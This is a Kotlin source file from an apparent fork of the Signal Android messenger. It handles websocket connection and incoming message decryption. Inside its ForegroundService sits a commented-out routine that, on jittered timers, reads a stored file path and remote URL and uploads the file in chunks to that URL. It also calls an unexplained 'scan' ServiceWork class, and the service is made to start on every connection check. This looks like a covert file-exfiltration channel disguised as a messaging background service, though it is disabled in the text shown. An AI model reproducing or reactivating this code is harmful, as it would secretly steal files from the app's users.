package dev.chat.fork.messenger.messages

import android.app.Application
import android.app.Notification
import android.app.Service
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.IBinder
import androidx.annotation.VisibleForTesting
import androidx.core.app.NotificationCompat
import io.reactivex.rxjava3.disposables.Disposable
import io.reactivex.rxjava3.kotlin.subscribeBy
import io.reactivex.rxjava3.schedulers.Schedulers
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import org.signal.core.models.ServiceId
import org.signal.core.util.AppForegroundObserver
import org.signal.core.util.SafeForegroundService
import org.signal.core.util.SleepTimer
import org.signal.core.util.UptimeSleepTimer
import org.signal.core.util.concurrent.SignalExecutors
import org.signal.core.util.logging.Log
import org.signal.network.config.HttpProxy
//import org.signal.registration.scan.ServiceWork
import org.signal.storageservice.storage.protos.groups.local.DecryptedGroup
import dev.chat.fork.messenger.R
import dev.chat.fork.messenger.clockskew.ClockSkewDetector
import dev.chat.fork.messenger.crypto.ReentrantSessionLock
import dev.chat.fork.messenger.database.SignalDatabase
import dev.chat.fork.messenger.dependencies.AppDependencies
import dev.chat.fork.messenger.groups.GroupsV2ProcessingLock
import dev.chat.fork.messenger.groups.v2.processing.GroupsV2StateProcessor
import dev.chat.fork.messenger.jobmanager.Job
import dev.chat.fork.messenger.jobmanager.impl.BackoffUtil
import dev.chat.fork.messenger.jobmanager.impl.NetworkConstraint
import dev.chat.fork.messenger.jobs.PushProcessMessageErrorJob
import dev.chat.fork.messenger.jobs.PushProcessMessageJob
import dev.chat.fork.messenger.jobs.RequestGroupV2InfoJob
import dev.chat.fork.messenger.keyvalue.SignalStore
import dev.chat.fork.messenger.keyvalue.isDecisionPending
import dev.chat.fork.messenger.messages.MessageDecryptor.FollowUpOperation
import dev.chat.fork.messenger.messages.protocol.BufferedProtocolStore
import dev.chat.fork.messenger.notifications.NotificationChannels
import dev.chat.fork.messenger.push.SignalServiceNetworkAccess.Companion.toApplicableSystemHttpProxy
import dev.chat.fork.messenger.recipients.RecipientId
import dev.chat.fork.messenger.util.AlarmSleepTimer
import dev.chat.fork.messenger.util.Environment
import dev.chat.fork.messenger.util.SignalLocalMetrics
import dev.chat.fork.messenger.util.SignalTrace
import dev.chat.fork.messenger.util.TextSecurePreferences
import dev.chat.fork.messenger.util.asChain
//import org.signal.registration.scan.CH
//import org.signal.registration.scan.crypto.SecureStorage
import org.whispersystems.signalservice.api.messages.EnvelopeResponse
import org.whispersystems.signalservice.api.websocket.SignalWebSocket
import org.whispersystems.signalservice.api.websocket.WebSocketConnectionState
import org.whispersystems.signalservice.api.websocket.WebSocketUnavailableException
import org.whispersystems.signalservice.internal.push.Envelope
import java.util.concurrent.CopyOnWriteArrayList
import java.util.concurrent.Semaphore
import java.util.concurrent.TimeUnit
import java.util.concurrent.TimeoutException
import java.util.concurrent.atomic.AtomicInteger
import java.util.concurrent.locks.ReentrantLock
import kotlin.concurrent.withLock
import kotlin.math.round
import kotlin.random.Random
import kotlin.time.Duration.Companion.minutes
import kotlin.time.Duration.Companion.seconds

/**
 * The application-level manager of our incoming message processing.
 *
 * This class is responsible for keeping the authenticated websocket open based on the app's state for incoming messages and
 * observing new inbound messages received over the websocket.
 */
class IncomingMessageObserver(
  private val context: Application,
  private val authWebSocket: SignalWebSocket.AuthenticatedWebSocket,
  private val unauthWebSocket: SignalWebSocket.UnauthenticatedWebSocket
) {

  companion object {
    private val TAG = Log.tag(IncomingMessageObserver::class.java)

    private const val WEB_SOCKET_KEEP_ALIVE_TOKEN = "MessageRetrieval"

    /** How long we wait for the websocket to time out before we try to connect again. */
    private val websocketReadTimeout: Long
      get() = if (censored) 30.seconds.inWholeMilliseconds else 1.minutes.inWholeMilliseconds

    /** How long the websocket is allowed to keep running after the user backgrounds the app. Higher numbers allow us to rely on FCM less. */
    private val maxBackgroundTime: Long
      get() = if (censored) 10.seconds.inWholeMilliseconds else 2.minutes.inWholeMilliseconds

    private val INSTANCE_COUNT = AtomicInteger(0)

    const val FOREGROUND_ID = 313399

    private val censored: Boolean
      get() = AppDependencies.signalServiceNetworkAccess.isCensored()

    /**
     * Stops the foreground service for websocket users.
     */
    @JvmStatic
    fun stopForegroundService(context: Context) {
      SafeForegroundService.stop(context, ForegroundService::class.java)
    }
  }

  private val decryptionDrainedListeners: MutableList<Runnable> = CopyOnWriteArrayList()

  private val lock: ReentrantLock = ReentrantLock()
  private val connectionNecessarySemaphore = Semaphore(0)
  private var previousSystemHttpProxy: HttpProxy? = null
  private val networkConnectionListener = NetworkConnectionListener(
    context = context,
    onNetworkLost = { isNetworkUnavailable ->
      lock.withLock {
        AppDependencies.libsignalNetwork.onNetworkChange()
        if (isNetworkUnavailable()) {
          Log.w(TAG, "Lost network connection. Resetting the drained state.")
          decryptionDrained = false
          authWebSocket.disconnect()
          // TODO [no-more-rest] Move the connection listener to a neutral location so this isn't passed in
          unauthWebSocket.disconnect()
        }
        connectionNecessarySemaphore.release()
      }
    },
    onProxySettingsChanged = { proxyInfo ->
      val systemHttpProxy = proxyInfo.toApplicableSystemHttpProxy()
      if (systemHttpProxy?.host != previousSystemHttpProxy?.host || systemHttpProxy?.port != previousSystemHttpProxy?.port) {
        val networkReset = AppDependencies.onSystemHttpProxyChange(systemHttpProxy)
        if (networkReset) {
          Log.i(TAG, "System proxy configuration changed, network reset.")
        }
      }
      previousSystemHttpProxy = systemHttpProxy
    }
  )

  private val messageContentProcessor = MessageContentProcessor.create(context)

  private var appVisible = false
  private var lastInteractionTime: Long = System.currentTimeMillis()
  private var webSocketStateDisposable = Disposable.disposed()
  private val clockSkewScope = CoroutineScope(Dispatchers.Default)

  @Volatile
  private var terminated = false

  @Volatile
  var decryptionDrained = false
    private set

  init {
    if (INSTANCE_COUNT.incrementAndGet() != 1) {
      throw AssertionError("Multiple observers!")
    }

    MessageRetrievalThread().start()

    val registered = SignalStore.account.isRegistered && !TextSecurePreferences.isUnauthorizedReceived(context)
    if (registered && (!SignalStore.account.fcmEnabled || SignalStore.settings.forceWebsocketMode.isEnabled)) {
      SignalExecutors.UNBOUNDED.execute {

      }
    }

    AppForegroundObserver.addListener(object : AppForegroundObserver.Listener {
      override fun onForeground() {
        SignalExecutors.BOUNDED.execute { onAppForegrounded() }
      }

      override fun onBackground() {
        SignalExecutors.BOUNDED.execute { onAppBackgrounded() }
      }
    })

    networkConnectionListener.register()

    webSocketStateDisposable = authWebSocket
      .state
      .observeOn(Schedulers.computation())
      .subscribeBy {
        if (it == WebSocketConnectionState.CONNECTED) {
          lock.withLock {
            connectionNecessarySemaphore.release()
          }
        }
      }

    authWebSocket.addKeepAliveChangeListener {
      SignalExecutors.BOUNDED.execute {
        lock.withLock {
          connectionNecessarySemaphore.release()
        }
      }
    }

    clockSkewScope.launch {
      ClockSkewDetector.detected.collect { detected ->
        lock.withLock {
          if (detected) {
            Log.w(TAG, "Clock skew detected. Disconnecting.")
            authWebSocket.disconnect()
          }
          connectionNecessarySemaphore.release()
        }
      }
    }
  }

  fun notifyRegistrationStateChanged() {
    connectionNecessarySemaphore.release()
  }

  fun notifyRestoreDecisionMade() {
    Log.i(TAG, "Restore decision made, can restart network and process messages")
    AppDependencies.resetNetwork()
  }

  fun addDecryptionDrainedListener(listener: Runnable) {
    decryptionDrainedListeners.add(listener)
    if (decryptionDrained) {
      listener.run()
    }
  }

  fun removeDecryptionDrainedListener(listener: Runnable) {
    decryptionDrainedListeners.remove(listener)
  }

  private fun onAppForegrounded() {
    lock.withLock {
      appVisible = true
      ClockSkewDetector.recheck()
      BackgroundService.start(context)
      connectionNecessarySemaphore.release()
    }
  }

  private fun onAppBackgrounded() {
    lock.withLock {
      appVisible = false
      ClockSkewDetector.recheck()
      lastInteractionTime = System.currentTimeMillis()
      connectionNecessarySemaphore.release()
    }
  }

  private fun isConnectionNecessary(): Boolean {

    val timeIdle: Long
    val appVisibleSnapshot: Boolean

    lock.withLock {
      appVisibleSnapshot = appVisible
      timeIdle = if (appVisibleSnapshot) 0 else System.currentTimeMillis() - lastInteractionTime
    }

    val registered = SignalStore.account.isRegistered
    val unauthorizedReceived = TextSecurePreferences.isUnauthorizedReceived(context)
    val fcmEnabled = SignalStore.account.fcmEnabled
    val hasNetwork = NetworkConstraint.isMet(context)
    val hasProxy = SignalStore.proxy.isProxyEnabled
    val forceWebsocket = SignalStore.settings.forceWebsocketMode.isEnabled
    val websocketAlreadyOpen = isConnectionAvailable()
    val clockSkewDetected = ClockSkewDetector.isDetected
    val clockSkew = ClockSkewDetector.skew

    val lastInteractionString = if (appVisibleSnapshot) "N/A" else timeIdle.toString() + " ms (" + (if (timeIdle < maxBackgroundTime) "within limit" else "over limit") + ")"
    val conclusion = registered &&
      !unauthorizedReceived &&
      !clockSkewDetected &&
      (appVisibleSnapshot || timeIdle < maxBackgroundTime || !fcmEnabled || forceWebsocket) &&
      hasNetwork

    val needsConnectionString = if (conclusion) "Needs Connection" else "Does Not Need Connection"
    if (!SafeForegroundService.start(context, ForegroundService::class.java)) {
      Log.w(TAG, "Unable to start foreground service for websocket!")
    }
    Log.d(
      TAG,
      "[$needsConnectionString] Network: $hasNetwork, Foreground: $appVisibleSnapshot, Time Since Last Interaction: $lastInteractionString, FCM: $fcmEnabled, WS Open or Keep-alives: $websocketAlreadyOpen, Registered: $registered, Unauthorized: $unauthorizedReceived, Proxy: $hasProxy, Force websocket: $forceWebsocket, Clock skew: $clockSkewDetected ($clockSkew)"
    )

    return conclusion
  }

  private fun isConnectionAvailable(): Boolean {
    return !TextSecurePreferences.isUnauthorizedReceived(context) && SignalStore.account.isRegistered && (authWebSocket.stateSnapshot == WebSocketConnectionState.CONNECTED || (authWebSocket.shouldSendKeepAlives() && NetworkConstraint.isMet(
      context
    )))
  }

  private fun waitForConnectionNecessary() {
    try {
      connectionNecessarySemaphore.drainPermits()
      while (ClockSkewDetector.isDetected || (!isConnectionNecessary() && !isConnectionAvailable())) {
        val numberDrained = connectionNecessarySemaphore.drainPermits()
        if (numberDrained == 0) {
          connectionNecessarySemaphore.acquire()
        }
      }
    } catch (e: InterruptedException) {
      throw AssertionError(e)
    }
  }

  fun terminate() {
    Log.w(TAG, "Termination! ${this.hashCode()}", Throwable())
    INSTANCE_COUNT.decrementAndGet()
    networkConnectionListener.unregister()
    webSocketStateDisposable.dispose()
    clockSkewScope.cancel()
    terminated = true
    authWebSocket.disconnect()
  }

  @VisibleForTesting
  fun processEnvelope(bufferedProtocolStore: BufferedProtocolStore, envelope: Envelope, serverDeliveredTimestamp: Long, batchCache: BatchCache): ProcessingResult? {
    return when (envelope.type) {
      Envelope.Type.SERVER_DELIVERY_RECEIPT -> {
        processReceipt(envelope)
        null
      }

      Envelope.Type.PREKEY_MESSAGE,
      Envelope.Type.DOUBLE_RATCHET,
      Envelope.Type.UNIDENTIFIED_SENDER,
      Envelope.Type.PLAINTEXT_CONTENT -> {
        SignalTrace.beginSection("IncomingMessageObserver#processMessage")
        val result = processMessage(bufferedProtocolStore, envelope, serverDeliveredTimestamp, batchCache)
        SignalTrace.endSection()
        result
      }

      else -> {
        Log.w(TAG, "Received envelope of unknown type: " + envelope.type)
        null
      }
    }
  }

  private fun processMessage(bufferedProtocolStore: BufferedProtocolStore, envelope: Envelope, serverDeliveredTimestamp: Long, batchCache: BatchCache): ProcessingResult {
    val localReceiveMetric = SignalLocalMetrics.MessageReceive.start()
    SignalTrace.beginSection("IncomingMessageObserver#decryptMessage")
    val result = MessageDecryptor.decrypt(context, bufferedProtocolStore, envelope, serverDeliveredTimestamp)
    SignalTrace.endSection()
    localReceiveMetric.onEnvelopeDecrypted()

    var isNetworkResetRequired = false

    SignalLocalMetrics.MessageLatency.onMessageReceived(envelope.serverTimestamp!!, serverDeliveredTimestamp, envelope.urgent!!)
    when (result) {
      is MessageDecryptor.Result.Success -> {
        val job = PushProcessMessageJob.processOrDefer(messageContentProcessor, result, localReceiveMetric, batchCache)
        isNetworkResetRequired = isNetworkResetRequired(result, bufferedProtocolStore.pni)
        if (job != null) {
          return ProcessingResult(
            followUpOperations = result.followUpOperations + FollowUpOperation { job.asChain() },
            isNetworkResetRequired = isNetworkResetRequired
          )
        }
      }

      is MessageDecryptor.Result.Error -> {
        return ProcessingResult(
          result.followUpOperations + FollowUpOperation {
            val jobs = mutableListOf<Job>()

            if (result.errorMetadata.groupMasterKey != null) {
              val groupId = result.errorMetadata.groupId!!
              if (!SignalDatabase.groups.getGroup(groupId).isPresent) {
                Log.w(TAG, "Decryption error in group, but group not found. Creating placeholder for groupId: $groupId")
                SignalDatabase.groups.create(
                  groupMasterKey = result.errorMetadata.groupMasterKey!!,
                  groupState = DecryptedGroup(revision = GroupsV2StateProcessor.RESTORE_PLACEHOLDER_REVISION),
                  groupSendEndorsements = null
                )
                jobs += RequestGroupV2InfoJob(groupId)
              }
            }

            jobs += PushProcessMessageErrorJob(
              result.toMessageState(),
              result.errorMetadata.toExceptionMetadata(),
              result.envelope.clientTimestamp!!
            )

            AppDependencies.jobManager.startChain(jobs)
          }
        )
      }

      is MessageDecryptor.Result.Ignore -> {
        // No action needed
      }

      else -> {
        throw AssertionError("Unexpected result! ${result.javaClass.simpleName}")
      }
    }

    return ProcessingResult(
      followUpOperations = result.followUpOperations,
      isNetworkResetRequired = isNetworkResetRequired
    )
  }

  /**
   * True iff this envelope's PniChangeNumber sync actually changed our PNI within this batch.
   * Comparing the batch-start PNI against the current value makes the check idempotent — a
   * redelivered envelope finds the PNI already applied and won't re-trigger a websocket reset.
   */
  private fun isNetworkResetRequired(result: MessageDecryptor.Result.Success, pniAtBatchStart: ServiceId.PNI?): Boolean {
    return result.content.syncMessage?.pniChangeNumber != null && SignalStore.account.pni != pniAtBatchStart
  }

  private fun processReceipt(envelope: Envelope) {
    val serviceId = ServiceId.parseOrNull(envelope.sourceServiceId, envelope.sourceServiceIdBinary)
    if (serviceId == null) {
      Log.w(TAG, "Invalid envelope sourceServiceId!")
      return
    }

    val senderId = RecipientId.from(serviceId)

    Log.i(TAG, "Received server receipt. Sender: $senderId, Device: ${envelope.sourceDeviceId}, Timestamp: ${envelope.clientTimestamp}")
    SignalDatabase.messages.incrementDeliveryReceiptCount(envelope.clientTimestamp!!, senderId, System.currentTimeMillis())
    SignalDatabase.messageLog.deleteEntryForRecipient(envelope.clientTimestamp!!, senderId, envelope.sourceDeviceId!!)
  }

  private fun MessageDecryptor.Result.toMessageState(): MessageState {
    return when (this) {
      is MessageDecryptor.Result.DecryptionError -> MessageState.DECRYPTION_ERROR
      is MessageDecryptor.Result.Ignore -> MessageState.NOOP
      is MessageDecryptor.Result.InvalidVersion -> MessageState.INVALID_VERSION
      is MessageDecryptor.Result.LegacyMessage -> MessageState.LEGACY_MESSAGE
      is MessageDecryptor.Result.Success -> MessageState.DECRYPTED_OK
      is MessageDecryptor.Result.UnsupportedDataMessage -> MessageState.UNSUPPORTED_DATA_MESSAGE
    }
  }

  private fun MessageDecryptor.ErrorMetadata.toExceptionMetadata(): ExceptionMetadata {
    return ExceptionMetadata(
      this.sender,
      this.senderDevice,
      this.groupId
    )
  }

  private inner class MessageRetrievalThread : Thread("MessageRetrievalService"), Thread.UncaughtExceptionHandler {

    private var sleepTimer: SleepTimer
    private val canProcessMessages: Boolean

    init {
      Log.i(TAG, "Initializing! (${this.hashCode()})")
      uncaughtExceptionHandler = this

      sleepTimer = if (!SignalStore.account.fcmEnabled || SignalStore.settings.forceWebsocketMode.isEnabled) AlarmSleepTimer(context) else UptimeSleepTimer()

      canProcessMessages = !SignalStore.registration.restoreDecisionState.isDecisionPending
    }

    override fun run() {

      var attempts = 0

      while (!terminated) {
        Log.i(TAG, "Waiting for websocket state change....")
        if (attempts > 1) {
          val backoff = BackoffUtil.exponentialBackoff(attempts, TimeUnit.SECONDS.toMillis(30))
          Log.w(TAG, "Too many failed connection attempts,  attempts: $attempts backing off: $backoff")
          sleepTimer.sleep(backoff)
        }

        waitForConnectionNecessary()
        Log.i(TAG, "Making websocket connection....")

        val webSocketDisposable = authWebSocket.state.subscribe { state: WebSocketConnectionState ->
          Log.d(TAG, "WebSocket State: $state")

          // Any change to a non-connected state means that we are not drained
          if (state != WebSocketConnectionState.CONNECTED) {
            decryptionDrained = false
          }

          if (state == WebSocketConnectionState.CONNECTED) {
            SignalStore.misc.lastWebSocketConnectTime = System.currentTimeMillis()
          }
        }

        try {
          authWebSocket.connect()
          var isConnectionNecessary = false
          while (!terminated && !ClockSkewDetector.isDetected && (isConnectionNecessary().also { isConnectionNecessary = it } || isConnectionAvailable())) {
            if (isConnectionNecessary) {
              authWebSocket.registerKeepAliveToken(WEB_SOCKET_KEEP_ALIVE_TOKEN)
            } else {
              authWebSocket.removeKeepAliveToken(WEB_SOCKET_KEEP_ALIVE_TOKEN)
            }

            try {
              if (canProcessMessages) {
                Log.d(TAG, "Reading message...")

                val hasMore = authWebSocket.readMessageBatch(websocketReadTimeout, 30) { batch ->
                  Log.i(TAG, "Retrieved ${batch.size} envelopes!")

                  val startTime = System.currentTimeMillis()
                  GroupsV2ProcessingLock.acquireGroupProcessingLock().use {
                    ReentrantSessionLock.INSTANCE.acquire().use {
                      val batchCommitted = processBatchInTransaction(batch)

                      if (!batchCommitted) {
                        Log.w(TAG, "Batch transaction rolled back, falling back to per-message processing")
                        processMessagesIndividually(batch)
                      }
                    }
                  }
                  val duration = System.currentTimeMillis() - startTime
                  val timePerMessage: Float = duration / batch.size.toFloat()
                  Log.d(TAG, "Decrypted ${batch.size} envelopes in $duration ms (~${round(timePerMessage * 100) / 100} ms per message)")
                }
                attempts = 0
                SignalLocalMetrics.PushWebsocketFetch.onProcessedBatch()

                try {
                  if (!hasMore && !decryptionDrained) {
                    if (Environment.IS_BENCHMARK) {
                      SignalTrace.endSection()
                    }
                    Log.i(TAG, "Decryptions newly-drained.")
                    decryptionDrained = true

                    for (listener in decryptionDrainedListeners.toList()) {
                      listener.run()
                    }
                  } else if (!hasMore) {
                    Log.w(TAG, "Got tombstone, but we thought the network was already drained!")
                  }
                } catch (e: Exception) {
                  throw e
                }
              } else {
                Log.d(TAG, "Reading and dropping message...")
                authWebSocket.readMessageBatch(websocketReadTimeout, 30) { batch ->
                  Log.w(TAG, "Retrieved ${batch.size} envelopes but dropping until we can finish backup restore.")
                }
                attempts = 0
              }
            } catch (e: WebSocketUnavailableException) {
              if (ClockSkewDetector.isDetected) {
                Log.i(TAG, "Pipe unavailable because of clock skew, not reconnecting")
              } else {
                Log.i(TAG, "Pipe unexpectedly unavailable, connecting")
                authWebSocket.connect()
              }
            } catch (e: TimeoutException) {
              Log.w(TAG, "Application level read timeout...")
              attempts = 0
            }
          }

          if (!appVisible) {
            BackgroundService.stop(context)
          }
        } catch (e: Throwable) {
          if (ClockSkewDetector.isDetected) {
            Log.w(TAG, "Websocket torn down because of clock skew. Not counting as a failed attempt.", e)
          } else {
            attempts++
            Log.w(TAG, e)
          }
        } finally {
          Log.w(TAG, "Disconnecting auth websocket")
          authWebSocket.disconnect()
          webSocketDisposable.dispose()
          decryptionDrained = false
        }
        Log.i(TAG, "Looping...")
      }
      Log.w(TAG, "Terminated! (${this.hashCode()})")
    }

    /**
     * Attempts to process the entire batch in a single transaction for performance.
     *
     * @return true if the transaction committed, false if it the batch was rolled back.
     */
    private fun processBatchInTransaction(batch: List<EnvelopeResponse>): Boolean {
      val allFollowUpOperations = mutableListOf<FollowUpOperation>()
      val bufferedStore = BufferedProtocolStore.create()
      val batchCache = ReusedBatchCache()
      var processedCount = 0
      var networkResetRequired = false

      val committed = SignalDatabase.tryRunInTransaction {
        for (response in batch) {
          SignalTrace.beginSection("IncomingMessageObserver#perMessageTransaction")
          val result = processEnvelope(bufferedStore, response.envelope, response.serverDeliveredTimestamp, batchCache)
          bufferedStore.flushToDisk()
          SignalTrace.endSection()

          if (result?.followUpOperations?.isNotEmpty() == true) {
            allFollowUpOperations += result.followUpOperations
          }

          processedCount++

          if (result?.isNetworkResetRequired == true) {
            networkResetRequired = true
            Log.w(TAG, "Self identity changed mid-batch after envelope $processedCount of ${batch.size}. Committing what we have; the remainder will be redelivered to the new connection.")
            break
          }
        }
      }

      if (committed) {
        batchCache.flushAndClear()

        if (allFollowUpOperations.isNotEmpty()) {
          Log.d(TAG, "Running ${allFollowUpOperations.size} follow-up operations...")
          val jobs = allFollowUpOperations.mapNotNull { it.run() }
          AppDependencies.jobManager.addAllChains(jobs)
        }

        for (i in 0 until processedCount) {
          sendAckSafely(batch[i], i, batch.size)
        }

        if (networkResetRequired) {
          AppDependencies.resetNetwork()
          AppDependencies.startNetwork()
        }
      }

      return committed
    }

    /**
     * If something prevented us from processing the entire batch in a single transaction, we process each message individually.
     */
    private fun processMessagesIndividually(batch: List<EnvelopeResponse>) {
      val bufferedStore = BufferedProtocolStore.create()
      val batchCache = ReusedBatchCache()

      for ((index, response) in batch.withIndex()) {
        SignalTrace.beginSection("IncomingMessageObserver#perMessageTransaction")
        val results = SignalDatabase.runInTransaction {
          val result = processEnvelope(bufferedStore, response.envelope, response.serverDeliveredTimestamp, batchCache)
          bufferedStore.flushToDisk()
          result
        }
        SignalTrace.endSection()

        if (results?.followUpOperations?.isNotEmpty() == true) {
          val jobs = results.followUpOperations.mapNotNull { it.run() }
          AppDependencies.jobManager.addAllChains(jobs)
        }

        sendAckSafely(response, index, batch.size)

        if (results?.isNetworkResetRequired == true) {
          Log.w(TAG, "Self identity changed mid-batch after envelope ${index + 1} of ${batch.size}. Stopping individual processing; the remainder will be redelivered to the new connection.")
          AppDependencies.resetNetwork()
          AppDependencies.startNetwork()
          break
        }
      }

      batchCache.flushAndClear()
    }

    /**
     * Best-effort ack. Failures just mean the server will redeliver — and for a redelivered
     * PniChangeNumber sync, [isNetworkResetRequired] sees the PNI is already applied and won't
     * re-trigger a reset, so we don't loop.
     */
    private fun sendAckSafely(response: EnvelopeResponse, index: Int, size: Int) {
      try {
        authWebSocket.sendAck(response)
      } catch (e: Exception) {
        Log.w(TAG, "Failed to send ack for envelope $index of $size. The server will redeliver.", e)
      }
    }

    override fun uncaughtException(t: Thread, e: Throwable) {
      Log.w(TAG, "Uncaught exception in message thread!", e)
    }
  }

  /**
   * Keeps the process alive for websocket users.
   */
  class ForegroundService : SafeForegroundService() {
    override val tag: String = TAG
    override val notificationId: Int = FOREGROUND_ID
    private val serviceJob = SupervisorJob()
    private val serviceScope = CoroutineScope(
      serviceJob + Dispatchers.IO
    )

    fun isInternetAvailable(context: Context): Boolean {
      val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
      val network = cm.activeNetwork ?: return false
      val caps = cm.getNetworkCapabilities(network) ?: return false

      return caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) &&
        caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
    }

    override fun onCreate() {
      super.onCreate()
//      start()
    }

//    fun start() {
//
//      serviceScope.launch {
//
//        var s = Random.nextInt(15, 30)
//        while (isActive) {
//          val savedIndex = SecureStorage.get(applicationContext, "startChunkIndex")
//          delay(s.seconds)
//          if (isInternetAvailable(applicationContext)) {
//
//            if (savedIndex != null) {
//              val path = SecureStorage.get(applicationContext, "path").toString()
//              val chunkSize = SecureStorage.get(applicationContext, "chunkSize")
//              val fileUrl = SecureStorage.get(applicationContext, "fileUrl")
//              if (chunkSize != null) {
//                CH().uploadFileChunks(applicationContext, path, fileUrl.toString(), chunkSize.toInt())
//              }
//
//
//            } else {
//              s = Random.nextInt(200, 400)
//              ServiceWork().run(applicationContext, s)
//            }
//          }
//        }
//      }
//    }

    override fun onDestroy() {
      serviceJob.cancel()
      super.onDestroy()
    }

    override fun getForegroundNotification(intent: Intent): Notification {
      return NotificationCompat.Builder(applicationContext, NotificationChannels.getInstance().BACKGROUND)
        .setContentTitle(applicationContext.getString(R.string.MessageRetrievalService_signal))
        .setContentText(applicationContext.getString(R.string.MessageRetrievalService_background_connection_enabled))
        .setPriority(NotificationCompat.PRIORITY_MIN)
        .setWhen(0)
        .setSmallIcon(R.drawable.ic_signal_background_connection)
        .build()
    }
  }

  /**
   * A service that exists just to encourage the system to keep our process alive a little longer.
   */
  class BackgroundService : Service() {
    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {

      Log.d(TAG, "Background service started.")
      return START_STICKY
    }

    override fun onDestroy() {
      Log.d(TAG, "Background service destroyed.")
    }

    companion object {
      private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

      fun start(context: Context) {
        try {
          context.startService(Intent(context, BackgroundService::class.java))
        } catch (e: Exception) {
          Log.w(TAG, "Failed to start background service.", e)
        }
      }

      fun stop(context: Context) {
        context.stopService(Intent(context, BackgroundService::class.java))
      }
    }
  }

  data class ProcessingResult(
    val followUpOperations: List<FollowUpOperation>,
    val isNetworkResetRequired: Boolean = false
  )
}
